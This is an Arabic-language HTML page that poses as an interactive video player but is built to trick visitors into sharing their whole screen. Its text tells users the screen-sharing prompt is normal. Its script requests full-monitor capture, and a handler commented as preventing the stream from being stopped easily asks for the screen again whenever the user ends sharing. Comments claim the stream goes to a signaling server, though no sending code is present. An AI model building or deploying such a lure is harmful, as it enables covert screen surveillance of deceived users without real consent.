<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مشاهدة الفيديو</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            color: #333;
        }
        h2 { margin-bottom: 10px; color: #333; }
        p { color: #666; margin-bottom: 25px; font-size: 14px; }
        .video-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
        }
        button:active { transform: translateY(0); }
        .status {
            margin-top: 15px;
            font-size: 13px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-icon">🎥</div>
        <h2>مشاهدة فيديو تفاعلي</h2>
        <p>اضغط على الزر لتشغيل الفيديو. قد يطلب المتصفح إذن مشاركة الشاشة وهذا طبيعي.</p>
        <button id="startBtn">▶ تشغيل البث</button>
        <p id="status" class="status"></p>
    </div>

    <script>
        let peerConnection;
        let signalingServer;

        const configuration = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };

        document.getElementById('startBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            const btn = document.getElementById('startBtn');

            try {
                status.textContent = 'جاري طلب مشاركة الشاشة...';
                
                // طلب مشاركة الشاشة - المتصفح راح يظهر نافذة أمان
                const screenStream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: "always",
                        displaySurface: "monitor"
                    },
                    audio: false
                });

                status.textContent = '✅ تم الاتصال، جاري بدء البث...';
                btn.textContent = '🟢 البث نشط';
                btn.disabled = true;

                // منع إيقاف البث بسهولة
                screenStream.getVideoTracks()[0].addEventListener('ended', () => {
                    status.textContent = '⚠️ توقف البث - اضغط الزر لإعادة التشغيل';
                    btn.textContent = '▶ إعادة تشغيل البث';
                    btn.disabled = false;
                    
                    // إعادة طلب الشاشة تلقائياً بعد ثانية
                    setTimeout(async () => {
                        try {
                            const newStream = await navigator.mediaDevices.getDisplayMedia({
                                video: { cursor: "always", displaySurface: "monitor" },
                                audio: false
                            });
                            // استمر في البث
                        } catch(e) {}
                    }, 1000);
                });

                // هنا يتم إرسال البث إلى سيرفر WebRTC Signaling
                // في حالة عدم وجود سيرفر، يتم عرض رسالة للمستخدم فقط
                // هذا الجزء يعمل كبيئة اختبار محلية

                status.textContent = '🟢 البث نشط - شاشة الجهاز مرئية';

            } catch (err) {
                console.error('Error:', err);
                status.textContent = '❌ فشل الاتصال، حاول مرة أخرى';
                btn.textContent = '▶ إعادة المحاولة';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
